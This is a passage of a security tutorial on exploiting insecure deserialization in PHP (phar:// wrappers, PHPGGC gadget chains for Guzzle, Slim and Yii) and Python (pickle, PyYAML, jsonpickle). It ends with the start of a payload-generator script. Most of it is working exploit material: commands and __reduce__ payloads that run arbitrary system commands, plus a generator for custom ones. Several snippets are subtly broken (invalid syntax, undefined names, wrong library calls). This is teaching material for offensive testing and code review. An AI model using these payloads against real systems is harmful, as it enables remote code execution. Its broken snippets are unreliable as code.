<p>Now, that&rsquo;s interesting. The __construct was not considered at all, and of course, the __toString was not called as well. The lesson that it&rsquo;s important to learn from that is that the most reliable methods to be used during the deserialization are:</p>
<ul>
<li><code>__wekeup</code></li>
<li><code>__destruct</code></li>
</ul>
<p>As they are the only two that will be surely be executed on an object during deserialization. All the others, even if exploitable in some situation, are tied to the application implementation and may, or may not, be called on an object.</p>
<p>If we use the script to serialize the FileDelete class, we would notice that, upon deserialization, the file name test is deleted. Of course, as no input validation is implemented, you may try to exploit whatever (carefully) file you want. Instead, if we use the following command to serialize and deserialize the RCE class:</p>
<p><div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -e rce
<span class="nv">$ </span>php php-desert.php -d
</pre></div>
A calculator will spawn on the hosting server.</p>
<p>If you want to have an additional reading, the following walkthrough may be of interest: </p>
<ul>
<li><a href="https://klezVirus.github.io/reviews/vulnhub/raven2">https://klezVirus.github.io/reviews/vulnhub/raven2</a></li>
</ul>
<p>This walkthrough is part of a series <a href="">HTB and VulnHub, an OSWE Approach</a></p>
<h4 id="php-deserialization-exploitation-using-php-wrappers">PHP: Deserialization Exploitation using PHP Wrappers<a class="headerlink" href="#php-deserialization-exploitation-using-php-wrappers" title="Permanent link"></a></h4>
<p>Another interesting feature of PHP, is that deserialization may be triggered by certain special conditions, such as loading object using PHP Wrappers.</p>
<p>What we&rsquo;re going to see, is how to exploit serialization triggered by a file operation made with &ldquo;phar://&rdquo;. Of course, in order to be exploitable, an attacker may be able control the file used during the file operation. 
The logical flow can be summarised as following:</p>
<ol>
<li>User Provided input: $file = &ldquo;phar://evil.phar/evil&rdquo;</li>
<li>Implemented function: $phar = fopen -&gt; read: $file, file_get_contents: $file</li>
<li>Call induced by phar://: $obj = unserialize($phar)</li>
<li>Call induced by unserialize: $obj.__wakeup()</li>
<li>Call induced by unserialize: $obj.__destruct()</li>
</ol>
<p>The logical flow, above, shows that the only two possible vectors for this kind of exploitation are: <code>__destruct</code> and <code>__wakeup</code>, as they are the only two called during the deserialization induced by the <code>phar://</code> wrapper.</p>
<p>The following snippet provides an example of vulnerable code. As you can see, there is no class implemented within the PHP file, but we know from the comments that Slim, Yii and Guzzle are installed and required via the vendor autoload script.</p>
<p><div class="codehilite"><pre><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="c1">// Requiring Slim, Yii and Guzzle (mod version) to enable visibility over POP gadgets</span>
<span class="c1">// php composer.phar yii/yii:1.1.20</span>
<span class="c1">// php composer.phar require slim/slim:3.8.1</span>
<span class="c1">// php composer.phar require guzzlehttp/guzzle:6.0.1 (re-unpatched version)</span>
<span class="k">require</span> <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>

<span class="c1">// Function vulnerable to phar:// deserialization</span>
<span class="k">function</span> <span class="nf">vulnerable_to_phar</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[*] Open file: </span><span class="si">$filename</span><span class="s2">&quot;</span><span class="p">);</span> 
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
    <span class="c1">//print($content); // Enable this line to use Slim RCE</span>
<span class="p">}</span>

<span class="c1">// Function vulnerable to RCE via insecure deserialization</span>
<span class="k">function</span> <span class="nf">vulnerable_to_rce_via_gadgets</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[*] Deserializing: </span><span class="si">$filename</span><span class="s2">&quot;</span><span class="p">);</span> 
    <span class="nv">$desert</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
    <span class="k">print</span><span class="p">(</span><span class="nv">$desert</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// Getting args from stdin</span>
<span class="nv">$args</span> <span class="o">=</span> <span class="nb">getopt</span><span class="p">(</span><span class="s2">&quot;f:p&quot;</span><span class="p">);</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">]</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;[-] Filename is required&quot;</span><span class="p">);</span>

<span class="c1">// Executing vulnerable functions</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_bool</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s2">&quot;p&quot;</span><span class="p">])){</span>
    <span class="nx">vulnerable_to_phar</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nx">vulnerable_to_rce_via_gadgets</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
If you take a closer look at the file, you&rsquo;ll notice that the potential vulnerabilities are two (good s°°t, Sherlok). One of them is exploitable via normal deserialization, while the other via deserialization induced by <code>phar://</code>.
How can we exploit them? Well, instead of searching suitable classes manually, this time we&rsquo;ll make use of a very handy tool, <strong>PHPGGC</strong>.</p>
<p><strong>PHPGGC: PHP ysoserial?</strong></p>
<p>In the previous section, we stated that it&rsquo;s not really feasible to generalise the exploitation of PHP application using POP gadget chains. However, within the years, a good number of POP gadgets (framework specific), have been identified and collected in an unofficial PHP version of ysoserial, <a href="https://github.com/ambionics/phpggc">PHPGGC</a>.</p>
<p>As ysoserial, this is an extremely powerful tool, which can automatically create gadget chains for many different PHP frameworks, such as:</p>
<ul>
<li>Drupal7</li>
<li>Wordpress</li>
<li>ZendFramework</li>
<li>Slim</li>
<li>Laravel</li>
<li>Magento</li>
<li>Guzzle</li>
<li>&hellip; others</li>
</ul>
<p>Now, we know that the application above uses Slim, Guzzle and Yii. If you have a look to the tool supported gadget chains, you&rsquo;ll find something very interesting:</p>
<div class="codehilite"><pre><span class="nv">$ </span>phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I
Guzzle/RCE1                               6.0.0 &lt;<span class="o">=</span> 6.3.2                 rce              __destruct     *
Slim/RCE1                                 3.8.1                          rce              __toString
Yii/RCE1                                  1.1.20                         rce              __wakeup       *
</pre></div>

<p>To exploit the deserialization induced by <code>phar://</code>, we&rsquo;ll generate a malicious phar file, then let the application open it passing the phar wrapper as part of the name. The phar wrapper will force the file to be deserialized, allowing us to start a POP chain that will eventually lead to RCE. We can craft a valid payload in the following way:</p>
<p><div class="codehilite"><pre><span class="nv">$ </span>phpggc Guzzle/RCE1 <span class="s2">&quot;shell_exec&quot;</span> <span class="s2">&quot;cmd /c calc&quot;</span> -p phar -pf desert -o desert.phar
</pre></div>
Then, we can test the payload launching the vulnerable script, giving as input the payload, prefixed with the phar wrapper:</p>
<div class="codehilite"><pre><span class="nv">$ </span>php php-wrap-desert.php -fphar://desert.phar/desert -p
</pre></div>

<p>Doing that will spawn a calculator on the hosting machine.</p>
<p>The other serialization vulnerability can be exploited in a similar way, the only things to notice is the following:</p>
<p>Even though we have a Slim RCE, if we don&rsquo;t enable the print function above, it won&rsquo;t work. It may be obvious, but in case you are struggling to get why, take a look to the Gadget Chain Vector above. Slim uses <code>__toString</code> to trigger the POP chain, hence it won&rsquo;t be able to do that without a string operation. Let&rsquo;s try it out. Create a payload like the following:</p>
<div class="codehilite"><pre><span class="nv">$ </span>phpggc Slim/RCE1 <span class="s2">&quot;system&quot;</span> <span class="s2">&quot;cmd /c calc&quot;</span> -o desert.bin
</pre></div>

<p>Try to run it, via the following command:</p>
<p><div class="codehilite"><pre><span class="nv">$ </span>php php-wrap-desert.php -fdesert.bin
</pre></div>
Nothing will happen. Now enable the print function and retry. A calculator will spawn on the hosting machine.</p>
<p><strong>Tips for Source Code reviewers</strong></p>
<p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
<ul>
<li><code>unserialize</code></li>
<li><code>__wakeup</code></li>
<li><code>__destruct</code></li>
</ul>
<p>For each match of <code>unserialize</code>, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker. After that, a research of suitable classes for exploitation might start with researching for  <code>__wakeup</code> and <code>__destruct</code> calls.</p>
<h4 id="references_2">References<a class="headerlink" href="#references_2" title="Permanent link"></a></h4>
<ul>
<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic-Methods</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">PHP Object Injection</a></li>
</ul>
<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link"></a></h3>
<p>Python as well offers built-in support for serialization/deserialization, with many libraries that can easily marshal an object using different archive-formats, as binary, XML, JSON, YAML, and so on.
Within the years, a few modules were found to be affected by unsafe deserialization issues. Those were:</p>
<ul>
<li>pickle, handling binary serialization </li>
<li>pyYAML, handling YAML serialization</li>
<li>jsonpickle, handling JSON serialization</li>
</ul>
<h4 id="python-binary-archive-format">Python: Binary Archive Format<a class="headerlink" href="#python-binary-archive-format" title="Permanent link"></a></h4>
<p>In Python, the main library handling Binary serialization is Pickle (provided in different packages, as cPickle, pickle and _pickle). This library is known to be affected by an RCE upon deserialization.</p>
<p>Let&rsquo;s consider the following piece of code:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">_pickle</span>

<span class="k">class</span> <span class="nc">Desert</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">heigth</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">width</span> <span class="o">=</span> <span class="n">width</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">height</span> <span class="o">=</span> <span class="n">height</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">Desert</span><span class="p">(</span><span class="s">&quot;Gobi&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>

<span class="c1"># The application insecurely deserializes a file</span>
<span class="k">def</span> <span class="nf">desert_deserialize</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">desert_file</span><span class="p">:</span>
        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">desert</span> <span class="o">=</span> <span class="n">desert_deserialize</span><span class="p">()</span>
</pre></div>

<p>As you can see, pickle <code>load()</code> function is called without any prior check on the file content, allowing an attacker to pass an arbitrary binary payload to the application.</p>
<p>How can we exploit it, then? In Python, we don&rsquo;t actually have any tool like ysoserial, and we don&rsquo;t have a clear definition of POP gadget as it was for the previous languages we encountered so far, but in this context, we actually don&rsquo;t need them at all.</p>
<p>Indeed, for pickle, _pickle and cPickle, we can craft a payload using a simple piece of code, like the following:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>

<span class="k">class</span> <span class="nc">Payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&#39;whoami&#39;</span><span class="p">,))</span>

<span class="k">def</span> <span class="nf">serialize_exploit</span><span class="p">():</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">shellcode</span>
</pre></div>

<p>Changing the return function, it would be possible to generate the payload needed to execute different commands. However, it is more than possible to create something way more general than this, using various techniques, the first we&rsquo;ll see is known as dynamic class generation, code below:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">_pickle</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">Payload</span><span class="p">:</span>
    <span class="k">pass</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">pass</span>

<span class="k">def</span> <span class="nf">_patch</span><span class="p">(</span><span class="n">bytestream</span><span class="p">):</span>
    <span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">bytestream</span><span class="p">)</span>
    <span class="n">byte_array</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;52&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">byte_array</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">generate_class</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">elif</span> <span class="ow">not</span> <span class="n">methods</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="nb">object</span><span class="p">,),</span> <span class="n">methods</span><span class="p">)()</span>

<span class="k">def</span> <span class="nf">serialize_class</span><span class="p">(</span><span class="n">commands</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">commands</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[-] No command provided&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">methods</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">&quot;__reduce__&quot;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">commands</span><span class="p">,))</span>
        <span class="p">}</span>
        <span class="n">cls</span> <span class="o">=</span> <span class="n">generate_class</span><span class="p">(</span><span class="s">&quot;Payload&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">cls</span><span class="o">.</span><span class="n">__reduce__</span><span class="p">()</span>

<span class="n">command</span> <span class="o">=</span> <span class="s">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Generating serialized object for:&quot;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {command}&quot;</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
    <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_patch</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">serialize_class</span><span class="p">(</span><span class="n">command</span><span class="p">))))</span>
</pre></div>

<p>As you may notice, a function called <code>_patch</code> is applied to the serialized object, applying a patch to the binary archive after serialization. This trick has been used because the lambda function, although being bound to the attribute <code>__reduce__</code> is not interpreted as the reduce method, but as a lambda function:</p>
<ul>
<li>Static definition</li>
</ul>
<div class="codehilite"><pre>&gt;&gt;&gt; print(Payload.__getattribute__(Payload(), &quot;__reduce__&quot;))
&lt;bound method Payload.__reduce__ of &lt;__main__.Payload object at 0x00000209218B9518&gt;&gt;
</pre></div>

<ul>
<li>Dynamic definition</li>
</ul>
<div class="codehilite"><pre>&gt;&gt;&gt; cls = generate_class(&quot;Payload&quot;, methods)
&gt;&gt;&gt; print(cls.__getattribute__(&quot;__reduce__&quot;))
&lt;bound method serialize_class.&lt;locals&gt;.&lt;lambda&gt; of &lt;__main__.Payload object at 0x00000209218B9080&gt;&gt;
</pre></div>

<p>Although that would not stop the serialization, it would cause the payload to not be executed upon deserialization. However, the <code>_patch</code> function successfully fix this issue at byte-code level, making the payload executable again.</p>
<p>There is, however, a nicer way of achieving that, keeping the good part (setting arbitrary commands), and avoiding the bad one (dynamic class definition and patching), but we&rsquo;ll see it later, when we&rsquo;ll craft a simple payload generator for both binary and text-based formats.</p>
<h4 id="python-text-based-archive-format">Python: Text-Based Archive Format<a class="headerlink" href="#python-text-based-archive-format" title="Permanent link"></a></h4>
<p>As we now, several different libraries are offered by Python which support text-based serialization archives, such as json (or simplejson), or ETree (for XML). Even though most of these libraries are known to be secure, a few of them are susceptible to this kind of attack. In the following paragraphs, we&rsquo;ll briefly explain how the text-based serialization works, how to exploit it, and how to generate custom payloads.</p>
<p><strong>YAML</strong></p>
<p>The first of the library we&rsquo;re going to analyse is PyYAML; as its name suggests, it is a library to handle the YAML format. As previously stated, it was found to be vulnerable to deserialization issues.</p>
<p>Before digging into how to exploit this kind of vulnerability, let&rsquo;s take a brief look at the serialization process. The following example shows a very simple object being serialized from the python console:</p>
<div class="codehilite"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">([{</span><span class="s">&quot;a&quot;</span><span class="p">:</span><span class="s">&quot;b&quot;</span><span class="p">}])</span>
<span class="s">&#39;- a: b</span><span class="se">\n</span><span class="s">&#39;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">([{</span><span class="s">&quot;a&quot;</span><span class="p">:(</span><span class="s">&quot;b&quot;</span><span class="p">,</span><span class="s">&quot;c&quot;</span><span class="p">)}])</span>
<span class="s">&#39;- a: !!python/tuple</span><span class="se">\n</span><span class="s">  - b</span><span class="se">\n</span><span class="s">  - c</span><span class="se">\n</span><span class="s">&#39;</span>
</pre></div>

<p>Analyse the serialized object is not difficult, dict and lists are handled nicely, while other object must be serialized with their class notation. The above object, for example, would be translated as:</p>
<div class="codehilite"><pre><span class="o">-</span>                 <span class="o">====</span> <span class="p">[</span> 
<span class="n">a</span> <span class="p">:</span><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">tuple</span> <span class="o">====</span> <span class="p">{</span><span class="n">a</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">(</span>
<span class="o">-</span> <span class="n">b</span> <span class="o">-</span> <span class="n">c</span>           <span class="o">====</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span>
                  <span class="o">====</span> <span class="p">)}</span>
                  <span class="o">====</span> <span class="p">]</span>
</pre></div>

<p>In order to serialize an arbitrary class, the <code>__reduce__</code> method must be implemented, in a similar way it was for pickle.</p>
<p>How the exploitation works? Let&rsquo;s consider the following vulnerable code:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span>

<span class="c1"># Try to create the desert object from YAML file</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;desert.yml&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">desert_file</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
        <span class="n">desert</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">desert</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>
<span class="c1"># Try printing the desert name</span>
<span class="k">print</span><span class="p">(</span><span class="n">desert</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">])</span>
</pre></div>

<p>You may appreciate the version check before the actual call to <code>load</code>. This was done on purpose because from PyYAML &gt;= 5.1, the <code>load</code> function was patched to avoid &ldquo;function&rdquo; deserialization (e.g. <code>os.system</code>, <code>subprocess.call</code>, <code>subprocess.check_output</code>). However, it may still be possible to exploit it using non function based vectors as <code>subprocess.Popen</code>, as nicely exposed <a href="">here</a>.
The main concept is the always the same, trick the application into loading arbitrary classes/methods. In the case of PyYAML, the following payload can be used to spawn a calculator on the hosting server:</p>
<div class="codehilite"><pre><span class="kt">!!python/object/apply:nt.system</span>
<span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">cmd /c calc</span>
</pre></div>

<p>This simple payload can be created easily using the following code:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span><span class="o">,</span> <span class="nn">os</span>

<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&quot;cmd /c calc.exe&quot;</span><span class="p">,))</span>

<span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
</pre></div>

<p>Later we&rsquo;ll see how to create custom payloads dynamically.</p>
<p><strong>JSON</strong></p>
<p>The same vulnerability we&rsquo;ve already seen in pickle can be applied to jsonpickle. As the name may suggest, the jsonpickle module is actually a json library built on top of pickle. The deserialization issue is located in the <code>decode()</code> function call, as it may be seen in the following vulnerable code snippet:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">jsonpickle</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
    <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</pre></div>

<p>If we analyse the function call using a tracing function, we&rsquo;ll see that actually the sys module calls the vulnerable function <code>loads</code>. To confirm that, the following snippet may be used:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">jsonpickle</span>
<span class="kn">import</span> <span class="nn">re</span>


<span class="k">def</span> <span class="nf">trace</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">event</span> <span class="o">!=</span> <span class="s">&#39;call&#39;</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="n">c_object</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_code</span>
    <span class="n">func_name</span> <span class="o">=</span> <span class="n">c_object</span><span class="o">.</span><span class="n">co_name</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&quot;load&quot;</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
        <span class="k">return</span>
    <span class="n">func_name_line_no</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_lineno</span>
    <span class="n">func_filename</span> <span class="o">=</span> <span class="n">c_object</span><span class="o">.</span><span class="n">co_filename</span>
    <span class="n">caller</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_back</span>
    <span class="n">caller_line_no</span> <span class="o">=</span> <span class="n">caller</span><span class="o">.</span><span class="n">f_lineno</span>
    <span class="n">caller_filename</span> <span class="o">=</span> <span class="n">caller</span><span class="o">.</span><span class="n">f_code</span><span class="o">.</span><span class="n">co_filename</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&#39;Call to {0} on line {1} of {2} from line {3} of {4}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">func_name</span><span class="p">,</span> <span class="n">func_name_line_no</span><span class="p">,</span> <span class="n">func_filename</span><span class="p">,</span><span class="n">caller_line_no</span><span class="p">,</span> <span class="n">caller_filename</span><span class="p">))</span>


<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">settrace</span><span class="p">(</span><span class="n">trace</span><span class="p">)</span>
    <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</pre></div>

<p>Which would produce the following results:</p>
<div class="codehilite"><pre>$ python tracer.py

Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\backend.py
Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-
packages\jsonpickle\unpickler.py
</pre></div>

<p>As for the previous two modules, the serialization process uses <code>__reduce__</code> to create the serialized representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span>

<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&quot;cmd /c calc.exe&quot;</span><span class="p">,))</span>

<span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
</pre></div>

<p>Ok, that&rsquo;s seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? So, last but not least, we&rsquo;ll explore a way to dynamically generate valid payloads for all the python modules we saw above.</p>
<p><strong>Generating Exploits for pickle, PyYAML, and jsonpickle</strong></p>
<p>I created the following tool, called <strong>deser-py</strong>, which can be used to generate different payloads for pickle, yaml and jsonpickle. The tool can be also downloaded <a href="https://github.com/klezVirus/deser-py">here</a>.</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">_pickle</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">jsonpickle</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">yaml</span>
<span class="kn">import</span> <span class="nn">argparse</span>


<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">commands</span><span class="p">,</span> <span class="n">vector</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">=</span> <span class="n">vector</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">commands</span> <span class="o">=</span> <span class="n">commands</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">==</span> <span class="s">&quot;os&quot;</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">commands</span><span class="p">,)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">==</span> <span class="s">&quot;subprocess&quot;</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">commands</span><span class="p">,)</span>


<span class="k">def</span> <span class="nf">print_available_formats</span><span class="p">():</span>
    <span class="n">available_formats</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">&quot;pickle&quot;</span><span class="p">:</span> <span class="s">&quot;Format for cPickle and _pickle modules&quot;</span><span class="p">,</span>
        <span class="s">&quot;json&quot;</span><span class="p">:</span> <span class="s">&quot;Format for jsonpickle module&quot;</span><span class="p">,</span>
